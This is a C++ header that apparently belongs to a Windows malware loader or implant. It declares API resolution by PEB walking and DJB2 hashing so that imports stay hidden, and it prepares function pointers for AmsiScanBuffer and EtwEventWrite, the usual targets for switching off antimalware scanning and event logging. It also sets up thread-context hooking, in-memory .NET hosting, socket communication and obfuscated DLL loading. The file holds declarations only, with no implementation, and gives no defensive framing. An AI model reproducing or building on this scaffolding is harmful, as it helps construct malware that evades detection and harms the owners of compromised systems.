#pragma once
#include <cstdint>

// Must include Winsock headers BEFORE windows.h due to ordering requirements
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winternl.h>

// PEB walking API resolution by DJB2 hash
// No GetProcAddress, no LoadLibrary - everything resolved via PEB + export table

// Typedefs for ntdll functions resolved in Phase 1
typedef NTSTATUS(NTAPI* fn_LdrLoadDll)(
    PWCHAR PathToFile,
    ULONG Flags,
    PUNICODE_STRING ModuleFileName,
    PHANDLE ModuleHandle
);
typedef VOID(NTAPI* fn_RtlInitUnicodeString)(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString
);

// Typedefs for kernel32 functions resolved in Phase 2
typedef BOOL(WINAPI* fn_GetThreadContext)(HANDLE hThread, LPCONTEXT lpContext);
typedef BOOL(WINAPI* fn_SetThreadContext)(HANDLE hThread, const CONTEXT* lpContext);
typedef HANDLE(WINAPI* fn_GetCurrentThread)(void);
typedef PVOID(WINAPI* fn_AddVectoredExceptionHandler)(ULONG First, PVECTORED_EXCEPTION_HANDLER Handler);
typedef ULONG(WINAPI* fn_RemoveVectoredExceptionHandler)(PVOID Handle);
typedef HANDLE(WINAPI* fn_GetCurrentProcess)(void);

// Typedefs for Winsock functions (Phase 3, after LdrLoadDll ws2_32)
typedef int(WSAAPI* fn_WSAStartup)(WORD wVersionRequested, LPWSADATA lpWSAData);
typedef SOCKET(WSAAPI* fn_socket)(int af, int type, int protocol);
typedef int(WSAAPI* fn_connect)(SOCKET s, const struct sockaddr* name, int namelen);
typedef int(WSAAPI* fn_send)(SOCKET s, const char* buf, int len, int flags);
typedef int(WSAAPI* fn_recv)(SOCKET s, char* buf, int len, int flags);
typedef int(WSAAPI* fn_select)(int nfds, fd_set* readfds, fd_set* writefds, fd_set* exceptfds, const struct timeval* timeout);
typedef int(WSAAPI* fn_closesocket)(SOCKET s);
typedef int(WSAAPI* fn_WSACleanup)(void);
typedef int(WSAAPI* fn_getaddrinfo)(PCSTR pNodeName, PCSTR pServiceName, const ADDRINFOA* pHints, PADDRINFOA* ppResult);
typedef void(WSAAPI* fn_freeaddrinfo)(PADDRINFOA pAddrInfo);

// Typedef for mscoree (Phase 4)
typedef HRESULT(WINAPI* fn_CLRCreateInstance)(REFCLSID clsid, REFIID riid, LPVOID* ppInterface);

// Typedef for amsi (Phase 5)
typedef HRESULT(WINAPI* fn_AmsiScanBuffer)(void* amsiContext, void* buffer, ULONG length, const wchar_t* contentName, void* amsiSession, int* result);

// Typedef for NT ThreadPool
typedef NTSTATUS(NTAPI* fn_TpAllocWork)(void** WorkReturn, void* Callback, void* Context, void* Environment);
typedef void(NTAPI* fn_TpPostWork)(void* Work);
typedef void(NTAPI* fn_TpReleaseWork)(void* Work);

// Typedef for EtwEventWrite
typedef ULONG(NTAPI* fn_EtwEventWrite)(void* RegHandle, const void* EventDescriptor, ULONG UserDataCount, const void* UserData);

// Global struct holding all resolved function pointers (set-once during init)
struct ResolvedAPIs {
    // Phase 1: ntdll
    fn_LdrLoadDll pLdrLoadDll;
    fn_RtlInitUnicodeString pRtlInitUnicodeString;
    fn_EtwEventWrite pEtwEventWrite;
    fn_TpAllocWork pTpAllocWork;
    fn_TpPostWork pTpPostWork;
    fn_TpReleaseWork pTpReleaseWork;

    // Phase 2: kernel32
    fn_GetThreadContext pGetThreadContext;
    fn_SetThreadContext pSetThreadContext;
    fn_GetCurrentThread pGetCurrentThread;
    fn_AddVectoredExceptionHandler pAddVectoredExceptionHandler;
    fn_RemoveVectoredExceptionHandler pRemoveVectoredExceptionHandler;
    fn_GetCurrentProcess pGetCurrentProcess;

    // Phase 3: ws2_32
    fn_WSAStartup pWSAStartup;
    fn_socket pSocket;
    fn_connect pConnect;
    fn_send pSend;
    fn_recv pRecv;
    fn_select pSelect;
    fn_closesocket pClosesocket;
    fn_WSACleanup pWSACleanup;
    fn_getaddrinfo pGetaddrinfo;
    fn_freeaddrinfo pFreeaddrinfo;

    // Phase 4: mscoree
    fn_CLRCreateInstance pCLRCreateInstance;

    // Phase 5: amsi
    fn_AmsiScanBuffer pAmsiScanBuffer;
};

extern ResolvedAPIs g_apis;

// Resolve a function by DLL hash + function hash from PEB
void* resolve_function(uint32_t dll_hash, uint32_t func_hash);

// Get the base address of a DLL by hash from PEB
void* get_module_base(uint32_t dll_hash);

// Load a DLL via LdrLoadDll (must be called after Phase 1 resolves LdrLoadDll)
bool load_dll_obf(const wchar_t* dll_path, HANDLE* out_handle);

// Phase resolution functions
bool resolve_phase1_ntdll();
bool resolve_phase2_kernel32();
bool resolve_phase3_winsock();
bool resolve_phase4_mscoree();
bool resolve_phase5_amsi();
